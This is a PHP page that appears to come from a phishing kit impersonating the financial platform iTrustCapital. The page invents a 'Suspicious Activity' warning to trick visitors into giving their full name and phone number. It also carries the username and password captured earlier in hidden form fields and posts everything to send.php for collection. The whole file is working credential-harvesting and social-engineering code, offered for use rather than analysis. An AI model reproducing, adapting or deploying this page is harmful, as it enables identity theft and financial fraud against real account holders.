<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Verify | iTrustCapital';
        include_once './includes/meta.php';
        if(empty($_SESSION["username"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class='container'>
            <div class="row justify-content-center mt60">
                <div class='col-sm-4 shadow-lg p25'>
                    <div class='col-sm-12 text-center'>
                        <img src=<?= base_url('assets/img/logo.jpg') ?> width="140" alt="Logo" class="d-inline-block align-text-top" />
                        <h1 class='h4 fw-normal py15'>Verification Required</h1>
                        <div class='pb10 text-center text-danger fs17'>Important Message</div>
                        <div class='pb10 text-center text-danger'>Some Suspicious Activity Found With Your Account, Enter Your Full Name and Phone Number to Verify Your Identity.</div>
                    </div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <input type="hidden" name="username" value="<?=$_SESSION['username']?>" >
                        <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                        <div class="my25">
                            <input name="name" type="text" required="" minlength="3" maxlength="100" class="form-control form-control-lg fs14 lh30" placeholder="Full Name" value="">
                        </div>
                         <div className="my25">
                            <div class="form-control fs16">
                                <input name="phone_number" type="number" id="phone_number" required="" class="form-control-add" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class="text-center mx-auto d-grid gap-2 my15">
                            <button type="submit" class="btn btn-primary-2 btn-lg btn-block rounded-0 fs14 lh30">Verify</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>